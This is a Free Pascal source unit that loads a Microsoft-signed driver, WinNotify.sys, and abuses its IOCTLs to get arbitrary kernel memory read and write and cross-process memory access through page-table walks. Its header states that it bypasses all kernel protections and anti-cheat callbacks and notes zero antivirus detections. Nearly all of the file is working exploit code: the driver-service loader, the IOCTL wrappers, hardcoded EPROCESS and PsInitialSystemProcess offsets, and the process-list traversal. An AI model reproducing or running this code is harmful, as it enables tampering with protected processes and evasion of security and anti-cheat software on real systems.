unit PhysicalMemory;

{$mode objfpc}{$H+}

{ Physical memory & kernel R/W using WinNotify.sys (Microsoft-signed driver)
  Exposes kernel virtual memory read/write via IOCTLs 0x22200C/0x222040/0x222044
  and per-process page table walking via 0x222050/0x222054.
  
  Bypasses ALL kernel protections: ObRegisterCallbacks, handle-based access,
  and anti-cheat driver callbacks. No process handle needed.
  
  Driver: signeddrv.sys / WinNotify.sys — 2026, 0 VT detections, Microsoft-signed }

interface

uses
  windows, jwawindows, sysutils, classes;

type
  TPhysicalMemoryDriver = record
    DevicePath: string;
    DriverPath: string;
    ServiceName: string;
    hDevice: THandle;
    Loaded: Boolean;
  end;

  TWinNotifyKernelInfo = record
    KernelBase: QWORD;
  end;

  TPhysMemOps = class
  private
    FDriver: TPhysicalMemoryDriver;
    FIsInitialized: Boolean;
    FKernelInfo: TWinNotifyKernelInfo;

    function FindWinNotifyDriver: Boolean;
    function LoadDriverAsService(const DriverPath, ServiceName: string): Boolean;
    function UnloadDriverService(const ServiceName: string): Boolean;

    function IOCTL_GetKernelBase(const ModuleName: string): QWORD;
    function IOCTL_ReadQWORD(KernelAddr: QWORD): QWORD;
    procedure IOCTL_WriteQWORD(KernelAddr: QWORD; Value: QWORD);
    function IOCTL_ReadPhysicalWithCR3(CR3, VirtualAddr: QWORD; Buffer: Pointer; Size: DWORD): Boolean;
    function IOCTL_WritePhysicalWithCR3(CR3, VirtualAddr: QWORD; Buffer: Pointer; Size: DWORD): Boolean;

    function FindSystemEPROCESS: QWORD;
    function FindProcessEPROCESS(PID: DWORD): QWORD;
    function GetProcessCR3(ProcessEPROCESS: QWORD): QWORD;
  public
    constructor Create;
    destructor Destroy; override;

    function Initialize: Boolean;
    procedure Shutdown;

    function ReadKernelQWORD(KernelAddr: QWORD): QWORD;
    procedure WriteKernelQWORD(KernelAddr: QWORD; Value: QWORD);
    function GetKernelBase: QWORD;

    function ReadProcessMemory(ProcessId: DWORD; VirtualAddr: QWORD;
      Buffer: Pointer; Size: DWORD; var BytesRead: DWORD): Boolean;
    function WriteProcessMemory(ProcessId: DWORD; VirtualAddr: QWORD;
      Buffer: Pointer; Size: DWORD; var BytesWritten: DWORD): Boolean;

    property Initialized: Boolean read FIsInitialized;
    property KernelInfo: TWinNotifyKernelInfo read FKernelInfo;
  end;

var
  PhysMem: TPhysMemOps;

implementation

const
  // WinNotify IOCTLs
  IOCTL_WINNOTIFY_INFO  = $22200C;  // Kernel base disclosure
  IOCTL_WINNOTIFY_READ  = $222040;  // Arbitrary kernel read (5 QWORDs)
  IOCTL_WINNOTIFY_WRITE = $222044;  // Arbitrary kernel write (memmove)
  IOCTL_WINNOTIFY_PHYSREAD  = $222050;  // Physical read with DirBase
  IOCTL_WINNOTIFY_PHYSWRITE = $222054;  // Physical write with DirBase

  // EPROCESS offsets (Windows 10/11 x64 — verified on 10 22H2, 11 23H2)
  EPROCESS_UniqueProcessId    = $440;
  EPROCESS_ActiveProcessLinks = $448;
  EPROCESS_DirectoryTableBase = $28;
  EPROCESS_ImageFileName      = $5A8;

  // PsInitialSystemProcess offsets from ntoskrnl base (tried in order)
  PsInitSystemOffsets: array[0..3] of DWORD = (
    $CFC420,  // Win10 22H2
    $D19420,  // Win11 23H2
    $D0A420,  // Win11 21H2
    $CFC3E0   // Win10 21H1
  );

  SERVICE_KERNEL_DRIVER = 1;
  SERVICE_DEMAND_START  = 3;
  SERVICE_ERROR_NORMAL  = 1;

constructor TPhysMemOps.Create;
begin
  inherited;
  FIsInitialized := False;
  FillChar(FDriver, SizeOf(FDriver), 0);
  FillChar(FKernelInfo, SizeOf(FKernelInfo), 0);
  FDriver.hDevice := INVALID_HANDLE_VALUE;
end;

destructor TPhysMemOps.Destroy;
begin
  Shutdown;
  inherited;
end;

function TPhysMemOps.FindWinNotifyDriver: Boolean;
var
  searchPaths: array[0..3] of string;
  i: Integer;
begin
  Result := False;

  searchPaths[0] := 'C:\Windows\System32\drivers\WinNotify.sys';
  searchPaths[1] := ExtractFilePath(ParamStr(0)) + 'WinNotify.sys';
  searchPaths[2] := ExtractFilePath(ParamStr(0)) + 'signeddrv.sys';
  searchPaths[3] := 'C:\Windows\System32\drivers\signeddrv.sys';

  for i := 0 to High(searchPaths) do
  begin
    if FileExists(searchPaths[i]) then
    begin
      FDriver.DriverPath := searchPaths[i];
      FDriver.DevicePath := '\\.\WinNotify';
      FDriver.ServiceName := 'WinNotify';
      Result := True;
      Exit;
    end;
  end;
end;

function TPhysMemOps.LoadDriverAsService(const DriverPath, ServiceName: string): Boolean;
var
  hSCM, hService: THandle;
  status: TServiceStatus;
begin
  Result := False;

  hSCM := OpenSCManager(nil, nil, SC_MANAGER_ALL_ACCESS);
  if hSCM = 0 then Exit;

  hService := CreateService(hSCM,
    PChar(ServiceName), PChar(ServiceName),
    SERVICE_START or SERVICE_STOP or $00010000,
    SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
    PChar(DriverPath), nil, nil, nil, nil, nil);

  if hService = 0 then
    hService := OpenService(hSCM, PChar(ServiceName), SERVICE_START);

  if hService <> 0 then
  begin
    Result := StartService(hService, 0, nil);
    if not Result then
      Result := (GetLastError = ERROR_SERVICE_ALREADY_RUNNING);
    CloseServiceHandle(hService);
  end;

  CloseServiceHandle(hSCM);
end;

function TPhysMemOps.UnloadDriverService(const ServiceName: string): Boolean;
var
  hSCM, hService: THandle;
  status: TServiceStatus;
begin
  hSCM := OpenSCManager(nil, nil, SC_MANAGER_ALL_ACCESS);
  if hSCM = 0 then Exit(False);

  hService := OpenService(hSCM, PChar(ServiceName), SERVICE_STOP or $00010000);
  if hService <> 0 then
  begin
    ControlService(hService, SERVICE_CONTROL_STOP, status);
    DeleteService(hService);
    CloseServiceHandle(hService);
  end;

  CloseServiceHandle(hSCM);
  Result := True;
end;

// ---- WinNotify IOCTL implementation ----

// IOCTL 0x22200C — Kernel base disclosure
// Input: buffer with "ntoskrnl.exe" string pointer at offset 0
// Output: kernel base at outBuf + 0x10
function TPhysMemOps.IOCTL_GetKernelBase(const ModuleName: string): QWORD;
var
  inBuf: array[0..255] of Byte;
  outBuf: array[0..63] of Byte;
  moduleNameW: string;
  bytesReturned: DWORD;
  pStr: PChar;
begin
  Result := 0;
  if FDriver.hDevice = INVALID_HANDLE_VALUE then Exit;

  FillChar(inBuf, SizeOf(inBuf), 0);
  FillChar(outBuf, SizeOf(outBuf), 0);

  moduleNameW := ModuleName;
  StrPCopy(PChar(@inBuf[0]), moduleNameW);

  if DeviceIoControl(FDriver.hDevice, IOCTL_WINNOTIFY_INFO,
    @inBuf, SizeOf(inBuf), @outBuf, SizeOf(outBuf), bytesReturned, nil) then
  begin
    Result := PQWORD(@outBuf[$10])^;
  end;
end;

// IOCTL 0x222040 — Arbitrary kernel read (5 QWORDs)
// Quirk: only writes output if *(base + offset + 0x10) is non-zero
// To read QWORD at addr T: base = T - 0x10, offset = 0, result in out[0x20]
function TPhysMemOps.IOCTL_ReadQWORD(KernelAddr: QWORD): QWORD;
var
  inBuf: array[0..55] of Byte;
  outBuf: array[0..63] of Byte;
  bytesReturned: DWORD;
begin
  Result := 0;
  if FDriver.hDevice = INVALID_HANDLE_VALUE then Exit;

  FillChar(inBuf, SizeOf(inBuf), 0);
  FillChar(outBuf, SizeOf(outBuf), 0);

  PQWORD(@inBuf[0])^ := KernelAddr - $10;
  PQWORD(@inBuf[8])^ := 0;

  if DeviceIoControl(FDriver.hDevice, IOCTL_WINNOTIFY_READ,
    @inBuf, SizeOf(inBuf), @outBuf, SizeOf(outBuf), bytesReturned, nil) then
  begin
    Result := PQWORD(@outBuf[$20])^;
  end;
end;

// IOCTL 0x222044 — Arbitrary kernel write (memmove)
// Input buffer: {src_ptr(8), size(8), dst_ptr(8)}
procedure TPhysMemOps.IOCTL_WriteQWORD(KernelAddr: QWORD; Value: QWORD);
var
  inBuf: array[0..23] of Byte;
  srcVal: QWORD;
  bytesReturned: DWORD;
begin
  if FDriver.hDevice = INVALID_HANDLE_VALUE then Exit;

  FillChar(inBuf, SizeOf(inBuf), 0);
  srcVal := Value;

  // Source: pointer to our value in user-space
  PQWORD(@inBuf[0])^ := QWORD(@srcVal);
  // Size: 8 bytes
  PQWORD(@inBuf[8])^ := 8;
  // Destination: kernel address
  PQWORD(@inBuf[16])^ := KernelAddr;

  DeviceIoControl(FDriver.hDevice, IOCTL_WINNOTIFY_WRITE,
    @inBuf, SizeOf(inBuf), nil, 0, bytesReturned, nil);
end;

// IOCTL 0x222050 — Physical memory read with DirBase (CR3-based page table walk)
function TPhysMemOps.IOCTL_ReadPhysicalWithCR3(CR3, VirtualAddr: QWORD;
  Buffer: Pointer; Size: DWORD): Boolean;
var
  inBuf: array[0..31] of Byte;
  bytesReturned: DWORD;
begin
  Result := False;
  if FDriver.hDevice = INVALID_HANDLE_VALUE then Exit;

  FillChar(inBuf, SizeOf(inBuf), 0);
  PQWORD(@inBuf[0])^ := CR3;
  PQWORD(@inBuf[8])^ := VirtualAddr;
  PDWORD(@inBuf[16])^ := Size;
  // Output buffer pointer goes at +20

  Result := DeviceIoControl(FDriver.hDevice, IOCTL_WINNOTIFY_PHYSREAD,
    @inBuf, SizeOf(inBuf), Buffer, Size, bytesReturned, nil);
end;

// IOCTL 0x222054 — Physical memory write with DirBase
function TPhysMemOps.IOCTL_WritePhysicalWithCR3(CR3, VirtualAddr: QWORD;
  Buffer: Pointer; Size: DWORD): Boolean;
var
  totalSize: DWORD;
  pBuf: PByte;
  bytesReturned: DWORD;
begin
  Result := False;
  if FDriver.hDevice = INVALID_HANDLE_VALUE then Exit;
  if Size = 0 then Exit;

  totalSize := 20 + Size; // header(20) + data(Size)
  pBuf := GetMem(totalSize);
  if pBuf = nil then Exit;

  PQWORD(@pBuf[0])^ := CR3;
  PQWORD(@pBuf[8])^ := VirtualAddr;
  PDWORD(@pBuf[16])^ := Size;
  Move(Buffer^, pBuf[20], Size);

  Result := DeviceIoControl(FDriver.hDevice, IOCTL_WINNOTIFY_PHYSWRITE,
    pBuf, totalSize, nil, 0, bytesReturned, nil);

  FreeMem(pBuf);
end;

// ---- Kernel structure navigation ----

function TPhysMemOps.ReadKernelQWORD(KernelAddr: QWORD): QWORD;
begin
  Result := IOCTL_ReadQWORD(KernelAddr);
end;

procedure TPhysMemOps.WriteKernelQWORD(KernelAddr: QWORD; Value: QWORD);
begin
  IOCTL_WriteQWORD(KernelAddr, Value);
end;

function TPhysMemOps.GetKernelBase: QWORD;
begin
  Result := FKernelInfo.KernelBase;
end;

// Find System EPROCESS by trying known PsInitialSystemProcess offsets
function TPhysMemOps.FindSystemEPROCESS: QWORD;
var
  sysProc: QWORD;
  pidCheck: QWORD;
  i: Integer;
begin
  Result := 0;
  if FKernelInfo.KernelBase = 0 then Exit;

  for i := 0 to High(PsInitSystemOffsets) do
  begin
    sysProc := IOCTL_ReadQWORD(FKernelInfo.KernelBase + PsInitSystemOffsets[i]);
    if sysProc = 0 then Continue;

    pidCheck := IOCTL_ReadQWORD(sysProc + EPROCESS_UniqueProcessId);
    if pidCheck = 4 then
    begin
      Result := sysProc;
      Exit;
    end;
  end;
end;

function TPhysMemOps.FindProcessEPROCESS(PID: DWORD): QWORD;
var
  sysProc, current: QWORD;
  flink: QWORD;
  pid: QWORD;
  maxIter: Integer;
begin
  Result := 0;
  sysProc := FindSystemEPROCESS;
  if sysProc = 0 then Exit;

  current := sysProc;
  maxIter := 0;

  repeat
    flink := IOCTL_ReadQWORD(current + EPROCESS_ActiveProcessLinks);
    if flink = 0 then Break;

    // FLINK points to the next EPROCESS.ActiveProcessLinks, subtract offset to get EPROCESS
    current := flink - EPROCESS_ActiveProcessLinks;

    pid := IOCTL_ReadQWORD(current + EPROCESS_UniqueProcessId);
    if pid = PID then
    begin
      Result := current;
      Exit;
    end;

    Inc(maxIter);
  until (current = sysProc) or (maxIter > 1000);

  Result := 0;
end;

function TPhysMemOps.GetProcessCR3(ProcessEPROCESS: QWORD): QWORD;
begin
  if ProcessEPROCESS = 0 then Exit(0);
  Result := IOCTL_ReadQWORD(ProcessEPROCESS + EPROCESS_DirectoryTableBase);
end;

// ---- Public API ----

function TPhysMemOps.Initialize: Boolean;
begin
  Result := False;
  if FIsInitialized then
  begin
    Result := True;
    Exit;
  end;

  if not FindWinNotifyDriver then
  begin
    OutputDebugString('[PhysMem] WinNotify.sys not found');
    Exit;
  end;

  OutputDebugString(PChar('[PhysMem] Found: ' + FDriver.DriverPath));

  if not LoadDriverAsService(FDriver.DriverPath, FDriver.ServiceName) then
  begin
    OutputDebugString('[PhysMem] Failed to load driver service');
    Exit;
  end;

  FDriver.hDevice := CreateFile(PChar(FDriver.DevicePath),
    GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ or FILE_SHARE_WRITE,
    nil, OPEN_EXISTING, 0, 0);

  if FDriver.hDevice = INVALID_HANDLE_VALUE then
  begin
    OutputDebugString(PChar('[PhysMem] Failed to open ' + FDriver.DevicePath));
    Exit;
  end;

  FDriver.Loaded := True;

  // Get kernel base
  FKernelInfo.KernelBase := IOCTL_GetKernelBase('ntoskrnl.exe');
  if FKernelInfo.KernelBase = 0 then
  begin
    FKernelInfo.KernelBase := IOCTL_GetKernelBase('ntoskrnl');
    if FKernelInfo.KernelBase = 0 then
    begin
      OutputDebugString('[PhysMem] Failed to resolve kernel base');
      Exit;
    end;
  end;

  OutputDebugString(PChar('[PhysMem] Kernel base: 0x' + IntToHex(FKernelInfo.KernelBase, 16)));

  FIsInitialized := True;
  Result := True;
  OutputDebugString('[PhysMem] WinNotify kernel R/W initialized');
end;

procedure TPhysMemOps.Shutdown;
begin
  if FDriver.hDevice <> INVALID_HANDLE_VALUE then
  begin
    CloseHandle(FDriver.hDevice);
    FDriver.hDevice := INVALID_HANDLE_VALUE;
  end;

  if FDriver.Loaded then
  begin
    UnloadDriverService(FDriver.ServiceName);
    FDriver.Loaded := False;
  end;

  FIsInitialized := False;
end;

// Read target process memory through its CR3 (page table walk by driver)
function TPhysMemOps.ReadProcessMemory(ProcessId: DWORD; VirtualAddr: QWORD;
  Buffer: Pointer; Size: DWORD; var BytesRead: DWORD): Boolean;
var
  eprocess, cr3: QWORD;
  pageOffset, bytesInPage: DWORD;
  tmpBuf: array[0..4095] of Byte;
  pBuf, offset: DWORD;
begin
  Result := False;
  BytesRead := 0;
  pBuf := 0;

  if not FIsInitialized then Exit;

  eprocess := FindProcessEPROCESS(ProcessId);
  if eprocess = 0 then Exit;

  cr3 := GetProcessCR3(eprocess);
  if cr3 = 0 then Exit;

  // Read page by page through CR3-based translation
  while BytesRead < Size do
  begin
    offset := (VirtualAddr + BytesRead) and $FFF;
    bytesInPage := $1000 - offset;
    if bytesInPage > (Size - BytesRead) then
      bytesInPage := Size - BytesRead;

    FillChar(tmpBuf, SizeOf(tmpBuf), 0);
    if IOCTL_ReadPhysicalWithCR3(cr3, (VirtualAddr + BytesRead) and not QWORD($FFF),
      @tmpBuf, $1000) then
    begin
      Move(tmpBuf[offset], PByte(Buffer)[BytesRead], bytesInPage);
      BytesRead := BytesRead + bytesInPage;
    end
    else
      Break;
  end;

  Result := (BytesRead > 0);
end;

function TPhysMemOps.WriteProcessMemory(ProcessId: DWORD; VirtualAddr: QWORD;
  Buffer: Pointer; Size: DWORD; var BytesWritten: DWORD): Boolean;
var
  eprocess, cr3: QWORD;
  pageOffset, bytesInPage: DWORD;
  tmpBuf: array[0..4095] of Byte;
  offset: DWORD;
begin
  Result := False;
  BytesWritten := 0;

  if not FIsInitialized then Exit;

  eprocess := FindProcessEPROCESS(ProcessId);
  if eprocess = 0 then Exit;

  cr3 := GetProcessCR3(eprocess);
  if cr3 = 0 then Exit;

  while BytesWritten < Size do
  begin
    offset := (VirtualAddr + BytesWritten) and $FFF;
    bytesInPage := $1000 - offset;
    if bytesInPage > (Size - BytesWritten) then
      bytesInPage := Size - BytesWritten;

    FillChar(tmpBuf, SizeOf(tmpBuf), 0);
    // Read existing page, modify, write back
    if IOCTL_ReadPhysicalWithCR3(cr3, (VirtualAddr + BytesWritten) and not QWORD($FFF),
      @tmpBuf, $1000) then
    begin
      Move(PByte(Buffer)[BytesWritten], tmpBuf[offset], bytesInPage);
      IOCTL_WritePhysicalWithCR3(cr3, (VirtualAddr + BytesWritten) and not QWORD($FFF),
        @tmpBuf, $1000);
      BytesWritten := BytesWritten + bytesInPage;
    end
    else
      Break;
  end;

  Result := (BytesWritten > 0);
end;

initialization
  PhysMem := TPhysMemOps.Create;

finalization
  PhysMem.Free;

end.
